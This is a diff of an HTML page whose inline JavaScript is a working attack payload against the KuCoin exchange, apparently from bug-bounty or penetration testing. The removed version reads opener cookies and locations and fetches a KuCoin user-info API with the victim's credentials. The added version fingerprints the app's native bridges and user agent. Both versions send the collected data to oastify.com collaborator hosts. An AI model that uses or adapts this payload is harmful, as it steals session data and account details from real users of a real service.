@@ -1,51 +1,9 @@
-<html><body><script>
-var d="";
-
-// 1. Check window.opener (parent window access)
-try{
-  d+="OPENER:"+String(window.opener)+";";
-  if(window.opener){
-    try{d+="OP_LOC:"+window.opener.location.href+";";}catch(e){d+="OP_LOC_ERR:"+e.message.substring(0,50)+";";}
-    try{d+="OP_DOC:"+window.opener.document.title+";";}catch(e){d+="OP_DOC_ERR:"+e.message.substring(0,50)+";";}
-    try{d+="OP_COOKIE:"+window.opener.document.cookie+";";}catch(e){d+="OP_CK_ERR:"+e.message.substring(0,50)+";";}
-  }
-}catch(e){d+="OPENER_ERR:"+e.message.substring(0,50)+";";}
-
-// 2. Check frameElement (iframe parent access)
-try{
-  d+="FRAME:"+String(window.frameElement)+";";
-  if(window.frameElement){
-    try{d+="FR_PARENT:"+window.frameElement.ownerDocument.title+";";}catch(e){d+="FR_ERR:"+e.message.substring(0,50)+";";}
-  }
-}catch(e){d+="FRAME_ERR:"+e.message.substring(0,50)+";";}
-
-// 3. Fetch kucoin.com API with credentials (steal session data)
-try{
-  fetch("https://www.kucoin.com/_api/ucenter/user-info",{credentials:"include"}).then(function(r){
-    return r.text();
-  }).then(function(t){
-    d+="FETCH_USERINFO:"+t.substring(0,500)+";";
-    doExfil();
-  }).catch(function(e){d+="FETCH_ERR:"+e.message.substring(0,80)+";";doExfil();});
-}catch(e){d+="FETCH_EXC:"+e.message.substring(0,50)+";";doExfil();}
-
-// 4. Try XMLHttpRequest with credentials
-try{
-  var x=new XMLHttpRequest();
-  x.open("GET","https://www.kucoin.com/_api/ucenter/user-info",true);
-  x.withCredentials=true;
-  x.onload=function(){d+="XHR_USERINFO:"+x.responseText.substring(0,500)+";";doExfil();};
-  x.onerror=function(){d+="XHR_ERR;";};
-  x.send();
-}catch(e){d+="XHR_EXC:"+e.message.substring(0,50)+";";}
-
-// 5. Try parent/top access
-try{d+="PARENT:"+(window.parent===window?"SELF":"DIFF")+";";}catch(e){}
-try{d+="TOP:"+(window.top===window?"SELF":"DIFF")+";";}catch(e){}
-try{if(window.parent!==window){d+="PARENT_LOC:"+window.parent.location.href+";";};}catch(e){d+="PARENT_ERR:"+e.message.substring(0,50)+";";}
-
-function doExfil(){
-  window.location="https://mqg0a6ll0mdlk9rk2cf4b0p5cwiy60n86g8gjznh66.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));
-}
-setTimeout(doExfil,5000);
-</script></body></html>
+  <html><body><script>
+  var d="";
+  d+="KC:"+(typeof window.KuCoin)+";";
+  d+="FL:"+(typeof window.flutter_inappwebview)+";";
+  d+="WK:"+(typeof window.kcwallet)+";";
+  d+="JS:"+(typeof window.JSInterface)+";";
+  d+="UA:"+navigator.userAgent+";";
+  window.location="https://569aywt50799ihu7uwcbkqadq4wvkl8a.oastify.com/?d="+encodeURIComponent(d);
+  </script></body></html>
